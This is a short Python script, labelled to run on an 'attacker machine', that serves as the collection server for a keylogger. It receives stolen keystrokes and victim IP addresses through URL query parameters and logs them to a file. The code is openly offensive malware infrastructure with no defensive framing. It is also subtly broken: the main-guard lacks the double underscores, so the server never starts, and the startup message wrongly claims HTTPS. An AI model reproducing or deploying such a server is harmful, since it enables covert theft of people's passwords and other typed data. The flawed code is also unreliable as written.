# server.py - RUN THIS ON YOUR ATTACKER MACHINE
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

HOST_NAME = "0.0.0.0"  # Listen on all interfaces
SERVER_PORT = 8080      # Use a new, publicly accessible port

class KeyloggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the URL query parameters
        query_components = parse_qs(urlparse(self.path).query)

        # Extract IP and Keystrokes
        ip_address = self.client_address[0]
        log_data = query_components.get('log', ['N/A'])[0]

        # Extract the actual key data
        keys = query_components.get('keys', ['N/A'])[0]

        # Log the captured data
        with open("captured_data.log", "a") as logfile:
            logfile.write(f"[*] NEW HIT\n")
            logfile.write(f"[*] IP: {ip_address}\n")
            logfile.write(f"[*] Keys: {keys}\n")
            logfile.write(f"----------------------------------\n")

        # Send a 200 OK response back to the client
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes("OK", "utf-8"))

if name == "main":
    webServer = HTTPServer((HOST_NAME, SERVER_PORT), KeyloggerHandler)
    print(f"Server started on https://{HOST_NAME}:{SERVER_PORT}")

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        webServer.server_close()
        print("Server stopped.")